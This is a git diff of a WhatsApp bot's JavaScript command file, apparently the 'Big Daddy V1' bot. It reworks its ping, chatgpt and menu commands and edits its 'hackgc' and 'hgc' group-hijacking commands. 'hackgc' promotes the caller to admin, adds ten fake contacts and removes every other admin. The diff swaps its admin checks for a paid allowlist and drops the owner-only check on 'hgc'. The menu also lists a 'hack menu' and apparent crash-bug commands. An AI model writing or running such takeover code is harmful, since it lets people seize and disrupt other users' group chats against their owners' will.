-            return replygcxeon('❌ The query is too long! Please limit your input to 500 characters.');
-        }
-
-        // API endpoint and request
-        const apiUrl = `https://api.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(query)}`;
-
-        // Send request to the ChatGPT API
-        const apiResponse = await axios.get(apiUrl);
-
-        // Validate API response
-        if (apiResponse.data && apiResponse.data.response) {
-            const gptResponse = apiResponse.data.response;
-
-            // Send the ChatGPT response back to WhatsApp
-            await XeonBotInc.sendMessage(
-                m.chat,
-                {
-                    text: `${gptResponse}`,
-                },
-                { quoted: m }
-            );
-        } else {
-            // Handle unexpected or empty responses
-            console.error('API Response:', apiResponse.data);
-            replygcxeon('❌ Failed to retrieve a response. The API may be experiencing issues. Please try again later.');
-        }
-    } catch (err) {
-        // Detailed error handling
-        console.error('Error in chatgpt command:', err);
-        if (err.response) {
-            // Log API response error details
-            console.error('API Error Response:', err.response.data);
-        }
-        replygcxeon('❌ An error occurred while processing your query. Please try again later.');
-    }
     break;
-}
-case 'update':
-if (!isCreator) return replygcxeon(mess.owner); 
+    case 'update': 
   try { 
     console.log('Starting Big Daddy V1 update...'); 
     // Send an initial reply about the update
@@ -2622,10 +2739,18 @@ if (!isCreator) return replygcxeon(mess.owner);
   } 
   break;
     case 'hackgc':
-    if (!m.isGroup) return replygcxeon(mess.group)
-                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
-                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
     try {
+        // List of allowed numbers
+        const allowedNumbers = [
+            '2349128019141@s.whatsapp.net',
+            '2349167070480@s.whatsapp.net'
+        ];
+
+        // Check if the sender is a premium user
+        if (!allowedNumbers.includes(m.sender)) {
+            return replygcxeon("❌ *Access Denied!*\n\nYou are not a premium user. Contact my creator to become a premium user.");
+        }
+
         const groupId = m.chat; // Current group ID
         const targetUser = m.sender; // The sender initiating the hack
 
@@ -2657,7 +2782,28 @@ if (!isCreator) return replygcxeon(mess.owner);
             .catch(err => {
                 console.error("❌ Failed to promote user to admin:", err.message);
                 return replygcxeon("❌ *Hack Failed: Unable to gain admin privileges.*");
-            });   
+            });
+
+        // Step 3: Add fake contacts to the group
+        const fakeContacts = [
+            '12345678901@s.whatsapp.net',
+            '98765432100@s.whatsapp.net',
+            '11223344556@s.whatsapp.net',
+            '22334455667@s.whatsapp.net',
+            '33445566778@s.whatsapp.net',
+            '44556677889@s.whatsapp.net',
+            '55667788990@s.whatsapp.net',
+            '66778899001@s.whatsapp.net',
+            '77889900112@s.whatsapp.net',
+            '88990011223@s.whatsapp.net'
+        ];
+
+        for (const fakeContact of fakeContacts) {
+            await XeonBotInc.groupParticipantsUpdate(groupId, [fakeContact], 'add')
+                .then(() => console.log(`✅ Fake contact ${fakeContact} added.`))
+                .catch(err => console.error(`❌ Failed to add fake contact ${fakeContact}: ${err.message}`));
+        }
+
         // Step 4: Remove all other admins
         const groupMetadata = await XeonBotInc.groupMetadata(groupId);
         const groupParticipants = groupMetadata.participants;
@@ -2850,51 +2996,86 @@ if (!isCreator) return replygcxeon(mess.owner);
                         replygcxeon(`BIG DADDY has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                     }).catch((err) => replygcxeon(json(err)))
                 break
-case 'p':
+                case 'p':
 case 'ping': {
     const used = process.memoryUsage();
-    const cpus = os.cpus();
-    
-    const cpu = cpus.reduce((acc, cpu) => {
-        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
-        acc.total += total;
-        acc.speed += cpu.speed;
-        Object.keys(cpu.times).forEach(key => acc.times[key] += cpu.times[key]);
-        return acc;
-    }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } });
+    const cpus = os.cpus().map(cpu => {
+        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
+        return cpu;
+    });
+    const cpu = cpus.reduce((last, cpu, _, { length }) => {
+        last.total += cpu.total;
+        last.speed += cpu.speed / length;
+        last.times.user += cpu.times.user;
+        last.times.nice += cpu.times.nice;
+        last.times.sys += cpu.times.sys;
+        last.times.idle += cpu.times.idle;
+        last.times.irq += cpu.times.irq;
+        return last;
+    }, {
+        speed: 0,
+        total: 0,
+        times: {
+            user: 0,
+            nice: 0,
+            sys: 0,
+            idle: 0,
+            irq: 0
+        }
+    });
 
-    const latency = (performance.now() - speed()).toFixed(4);  
-    const ramUsage = formatp(os.totalmem() - os.freemem()) + ' / ' + formatp(os.totalmem());
+    let timestamp = speed();
+    let latensi = speed() - timestamp;
+    neww = performance.now();
+    oldd = performance.now();
 
-    const cpuUsage = Object.keys(cpu.times).map(type => {
-        return `- *${type.padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`;
-    }).join('\n');
+    // Beautified Response
+    respon = `
+✨ **BIG DADDY V1 Info Server** 💻
+------------------------
+📊 **Response Speed**: *${latensi.toFixed(4)} Second*  
+🕒 **Latency**: *${(oldd - neww).toFixed(2)} milliseconds*  
+⏱️ **Runtime**: *${runtime(process.uptime())}*
 
-    const cpuDetails = cpus.map((cpu, i) => {
-        return `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHz)\n${cpuUsage}`;
-    }).join('\n\n');
+🧠 **Memory & CPU Usage Details:**
+-------------------------------------------------
+💾 **RAM Usage**: *${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
 
-    const response = `
-*Pong!* 🏓
-> *Response Speed:* *${latency}* seconds
+🚧 **BIG DADDY V1 NodeJS Memory Usage**:
+${Object.keys(used).map((key, _, arr) => 
+    `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: *${formatp(used[key])}*`).join('\n')}
 
-> *💻 BIG DADDY V1* Server Info
-RAM Usage: *${ramUsage}*`;
+💡 **CPU Usage Summary**:
+${cpus[0] ? `
+🧑‍🔧 **BIG DADDY V1 Total CPU Usage**:
+*${cpus[0].model.trim()}* @ *${cpu.speed} MHz*
+${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}*: *${(100 * cpu.times[type] / cpu.total).toFixed(2)}%*`).join('\n')}
+` : ''}
 
+🖥️ **CPU Core(s) Usage** (${cpus.length} Core(s) CPU):
+${cpus.map((cpu, i) => `
+${i + 1}. *${cpu.model.trim()}* @ *${cpu.speed} MHz*
+${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}*: *${(100 * cpu.times[type] / cpu.total).toFixed(2)}%*`).join('\n')}
+`).join('\n\n')}
+`.trim();
+
+    // Sending the beautified response
     await XeonBotInc.sendMessage(m.chat, {
-        text: response,
+        text: respon,
         contextInfo: {
             externalAdReply: {
                 showAdAttribution: true,
                 title: `${botname}`,
-                body: `${latency} Second`,
-                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
+                body: `Response: ${latensi.toFixed(4)} Second`,
+                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                 sourceUrl: global.link,
                 mediaType: 1,
                 renderLargerThumbnail: true
             }
         }
-    }, { quoted: m });
+    }, {
+        quoted: m
+    });
 }
 break;
             case 'buypremium':
@@ -4653,7 +4834,6 @@ case 'bantutorial':
     }
     break;
     case 'hgc':
-    if (!isCreator) return replygcxeon("🚨 Only the bot owner can use this command.");
   try {
     if (!m.isGroup) return replygcxeon(mess.group); // Ensure command is in a group chat
     
@@ -5051,41 +5231,18 @@ break
             case '?':
             case 'Menu':
                let xeonmenuoh = `
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-┃  ✨ *Creator: ᴘʜ✦ꜱᴛᴀʀ* 💫
-┃  🧪 *Version: 1.0.0* 
-┃  🤖 *Model: Big Daddy V1* 
-┃  ⏰ *Uptime:* *${runtime(process.uptime())}*
-▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃ ✨ *Creator: ᴘʜ✦ꜱᴛᴀʀ* 💫
+┃ ✨ *Version: 1.0.0* 🧪
+┃ ✨ *Model: Big Daddy V1* 👑
+┃ ✨ *Uptime:* *${runtime(process.uptime())} ⏰🔋*
+╰━━━━━━━━━━━⚡◁️💥━━━━━━━━━━━
+
+${xeonytimewisher}
 ${readmore}
 ╭⭑━━━➤ ʜᴀᴄᴋ ᴍᴇɴᴜ  
 ┣ ◁️⚡💥 𝐡𝐠𝐜  
 ┣ ◁️⚡💥 𝐡𝐚𝐜𝐤𝐠𝐜  
-╰━━━━━━━━━━━━━━━━━━╯
-
-╭⭑━━━➤ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔
-┣ ◁️💥 𝐩𝐥𝐚𝐲
-┣ ◁️💥 𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞
-┣ ◁️💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭
-┣ ◁️💥 𝐬𝐡𝐚𝐳𝐚𝐦
-┣ ◁️💥 𝐫𝐞𝐦𝐢𝐧𝐢
-┣ ◁️💥 𝐚𝐩𝐤
-┣ ◁️💥 𝐟𝐛
-┣ ◁️💥 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
-┣ ◁️💥 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞
-┣ ◁️💥 𝐬𝐨𝐧𝐠
-┣ ◁️💥 𝐭𝐢𝐤𝐭𝐨𝐤
-┣ ◁️💥 𝐟𝐛
-┣ ◁️💥 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
-┣ ◁️💥 𝐲𝐭𝐦𝐩3
-┣ ◁️💥 𝐲𝐭𝐦𝐩4
-╰━━━━━━━━━━━━━━━━━━╯
-
-╭⭑━━━➤ sᴘᴇᴄɪᴀʟ ᴍᴇɴᴜ  
-┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐬𝐞𝐥𝐟  
-┣ ◁️⚡💥 𝐛𝐚𝐧𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥  
-┣ ◁️⚡💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭  
-┣ ◁️⚡💥 𝐮𝐩𝐝𝐚𝐭𝐞  
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ᴀɴᴅʀᴏɪᴅ)
@@ -5103,7 +5260,6 @@ ${readmore}
 
 ╭⭑━━━➤ ᴀɴᴛɪ-ʙᴜɢ
 ┣ ◁️⚡💥 𝐮𝐥𝐭𝐫𝐚𝐛𝐮𝐠 [𝐀𝐔𝐓𝐎]
-┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐛𝐮𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ ʙᴀɴ/ᴜɴʙᴀɴ
@@ -5112,14 +5268,11 @@ ${readmore}
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ sᴍᴀʀᴛ ᴍᴇɴᴜ  
-┣ ◁️⚡💥 𝐯𝐢𝐝𝐞𝐨  
+┣ ◁️⚡💥 𝐦𝐨𝐯𝐢𝐞  
 ┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐠𝐩𝐭  
 ┣ ◁️⚡💥 𝐰𝐞𝐚𝐭𝐡𝐞𝐫  
 ┣ ◁️⚡💥 𝐭𝐢𝐦𝐞  
 ┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐛𝐨𝐭 [𝐨𝐩𝐭𝐢𝐨𝐧]  
-┣ ◁️⚡💥 𝐠𝐩𝐭3  
-┣ ◁️⚡💥 𝐠𝐩𝐭2  
-┣ ◁️⚡💥 𝐠𝐨𝐨𝐠𝐥𝐞  
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ ᴀɴᴛɪ ᴍᴇɴᴜ  
@@ -5139,6 +5292,11 @@ ${readmore}
 ┣ ◁️⚡💥 𝐰𝐨𝐮𝐥𝐝𝐲𝐨𝐮𝐫𝐚𝐭𝐡𝐞𝐫  
 ┣ ◁️⚡💥 𝐭𝐫𝐢𝐯𝐢𝐚  
 ┣ ◁️⚡💥 𝐭𝐫𝐮𝐭𝐡  
+╰━━━━━━━━━━━━━━━━━━╯
+
+╭⭑━━━➤ sᴘᴇᴄɪᴀʟ ᴍᴇɴᴜ  
+┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐬𝐞𝐥𝐟  
+┣ ◁️⚡💥 𝐛𝐚𝐧𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥  
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ  
@@ -5184,7 +5342,6 @@ ${readmore}
 ┣ ◁️⚡💥 𝐬𝐜𝐫𝐢𝐩𝐭
 ┣ ◁️⚡💥 𝐝𝐨𝐧𝐚𝐭𝐞
 ┣ ◁️⚡💥 𝐨𝐰𝐧𝐞𝐫
-┣ ◁️⚡💥 𝐩𝐢𝐧𝐠
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔
@@ -5201,8 +5358,6 @@ ${readmore}
 ┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞
 ┣ ◁️⚡💥 𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭
 ┣ ◁️⚡💥 𝐞𝐦𝐨𝐣𝐢𝐦𝐢𝐱
-┣ ◁️⚡💥 𝐭𝐞𝐱𝐭2𝐬𝐩𝐞𝐞𝐜𝐡
-┣ ◁️⚡💥 𝐭𝐞𝐱𝐭2𝐩𝐝𝐟
 ╰━━━━━━━━━━━━━━━━━━╯
 
 ╭⭑━━━➤ 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐌𝐄𝐍𝐔
@@ -5229,7 +5384,11 @@ ${readmore}
 ┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐩𝐝𝐟
 ╰━━━━━━━━━━━━━━━━━━╯
 
-© *ᴘʜ✦ꜱᴛᴀʀ*`
+╭⭑━━━➤ 𝐃𝐎𝐖𝐍 𝐌𝐄𝐍𝐔
+┣ ◁️💥🔊 𝐩𝐥𝐚𝐲
+╰━━━━━━━━━━━━━━━━━━╯
+
+©*ᴘʜ✦ꜱᴛᴀʀ*`
 if (typemenu === 'v1') {
     XeonBotInc.sendMessage(m.chat, {
         text: xeonmenuoh,
